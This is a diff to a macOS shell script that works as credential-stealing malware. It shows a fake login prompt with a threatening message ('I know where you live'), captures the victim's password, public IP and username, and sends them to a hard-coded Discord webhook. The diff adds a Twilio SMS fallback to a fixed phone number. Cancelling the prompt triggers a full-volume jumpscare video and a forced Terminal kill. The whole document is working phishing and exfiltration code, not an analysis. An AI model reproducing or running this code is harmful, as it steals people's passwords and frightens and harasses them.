@@ -5,13 +5,16 @@
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 # - If a non-empty password is entered, it sends the password, public IP,
-#   and username to a Discord webhook using Python for JSON generation.
+#   and username to a Discord webhook if Python 3 is available.
+# - If Python 3 is not installed, it sends an SMS (via Twilio) to +1 650 823 2037.
 # - If the user cancels (or leaves the password empty), it downloads and plays
 #   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either python3 or python2 installed.
+#   - macOS with osascript, curl, and either python3 or python installed.
+#   - For SMS sending, set the following environment variables:
+#         TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_FROM_NUMBER.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -27,6 +30,9 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 capture="username=${username}\n____________________________________________\n\n"
 
 # --- Define AppleScript Login Prompt (Single Attempt) ---
+# The prompt shows:
+#   Line 1: "I know where you live, [FirstName]."
+#   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -118,22 +124,31 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
 
-    # --- Determine Python Interpreter (Prefer python3, fallback to python2) ---
     if command -v python3 &>/dev/null; then
-        PYTHON=python3
-    elif command -v python2 &>/dev/null; then
-        PYTHON=python2
+        # --- Python 3 is available, generate JSON payload and send to Discord.
+        payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
+        
+        # --- Send Payload to Discord Webhook ---
+        DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
+        curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
     else
-        echo "Neither Python3 nor Python2 is available. Exiting."
-        exit 1
+        # --- Python 3 is not available, send an SMS using Twilio.
+        # Ensure that TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, and TWILIO_FROM_NUMBER are set.
+        if [ -z "$TWILIO_ACCOUNT_SID" ] || [ -z "$TWILIO_AUTH_TOKEN" ] || [ -z "$TWILIO_FROM_NUMBER" ]; then
+            echo "Twilio credentials are not set. Cannot send SMS."
+            exit 1
+        fi
+        
+        # Prepare the message. (Note: Newlines in SMS may appear as spaces.)
+        message=$(cat /tmp/pass.txt)
+        
+        # Send the SMS via Twilio's API.
+        curl -X POST "https://api.twilio.com/2010-04-01/Accounts/${TWILIO_ACCOUNT_SID}/Messages.json" \
+             --data-urlencode "Body=${message}" \
+             --data-urlencode "From=${TWILIO_FROM_NUMBER}" \
+             --data-urlencode "To=+16508232037" \
+             -u "${TWILIO_ACCOUNT_SID}:${TWILIO_AUTH_TOKEN}"
     fi
-    
-    # --- Generate JSON Payload using the selected Python interpreter ---
-    payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
-    
-    # --- Send Payload to Discord Webhook ---
-    DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
-    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
     rm /tmp/pass.txt
     
     # --- Force Kill Terminal ---
